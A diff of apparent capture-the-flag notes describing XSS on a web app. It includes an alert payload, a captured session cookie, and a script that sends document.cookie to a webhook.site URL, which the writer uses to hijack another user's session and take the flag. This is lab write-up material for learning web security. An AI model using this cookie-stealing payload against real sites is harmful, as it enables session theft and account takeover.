@@ -2,23 +2,23 @@ I am able to inject HTML code
 
 `<h1>TESTING</h1>`
 
-![[Pasted image 20261006092216.png]]
+![](../images/Pasted%20image%2020261006092216.png)
 
 `<script>alert(document.domain);</script>`
 
 
 Vuln to XSS as well
 
-![[Pasted image 20261006092332.png]]
+![](../images/Pasted%20image%2020261006092332.png)
 
-![[Pasted image 20261006093850.png]]
+![](../images/Pasted%20image%2020261006093850.png)
 
 - Tried default admin credentials and didnt work
 
 
 Grabbed session cookie 
 
-![[Pasted image 20261006095259.png]]
+![](../images/Pasted%20image%2020261006095259.png)
 
 eyJ1c2VyIjp7ImlkIjo1LCJ1c2VybmFtZSI6ImhhY2tlciJ9fQ.asSX_Q.6nBDb-MuumRJSe1cCiacjBKK9LE
 
@@ -44,7 +44,7 @@ run a php server
 
 php -S "ip:80" 
 
-![[Pasted image 20261006102310.png]]
+![](../images/Pasted%20image%2020261006102310.png)
 
 apparently this is only grabbing my own cookie as we are not in the same network with the app so it cant call back with the second cookie , our methodology was correct. 
 
@@ -53,6 +53,6 @@ we just had to use a other method to grab the cookie
 <script>document.location='https://webhook.site/3eb7bce2-cc9c-4cc1-9f93-17447292febd?c='+encodeURIComponent(document.cookie)</script>
 
 
-![[Pasted image 20261006112113.png]]
+![](../images/Pasted%20image%2020261006112113.png)
 
 this was the correct session cookie , once we changed it to our we were able to log in to her account and grab the flag! 
